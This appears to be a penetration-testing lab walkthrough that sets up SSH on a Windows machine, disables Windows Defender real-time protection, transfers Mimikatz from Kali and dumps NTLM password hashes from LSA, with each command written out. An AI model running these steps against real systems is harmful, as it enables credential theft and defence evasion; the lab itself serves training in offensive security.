Lab 84 – How to use Mimikatz to extract all the passwords from a Windows machine

Objective: Learn how to use Mimikatz to get all passwords from a Windows machine.

Commands:

Task 1:

Open PowerShell as Administrator.
Install SSH tools for Windows:
arduino
Copy code
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start the SSH service and check its status:
sql
Copy code
Start-Service sshd
Get-Service sshd
Task 2:
Connect to the Windows machine from Kali using SSH:

css
Copy code
ssh IEUser@192.168.56.104
(Note: Replace IEUser@192.168.56.104 with appropriate username and IP address.)

Task 3:

Turn off Windows Defender’s real-time protection.
Transfer the Mimikatz file to the Windows machine using scp:
ruby
Copy code
scp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe \ IEUser@192.168.56.104:/Users/IEUser/
(Note: Ensure correct paths and user details.)

Task 4:

Execute Mimikatz:
Copy code
mimikatz.exe
Check if Mimikatz is running as Administrator:
arduino
Copy code
privilege::debug
Task 5:
Dump NTLM hashes from the system using Mimikatz:

arduino
Copy code
lsadump::lsa /patch
The provided commands allow users to set up SSH on a Windows machine, connect to it from a Kali machine, transfer Mimikatz, and then extract password hashes using Mimikatz. Always ensure you have permission and are authorized to perform such activities on the target system.
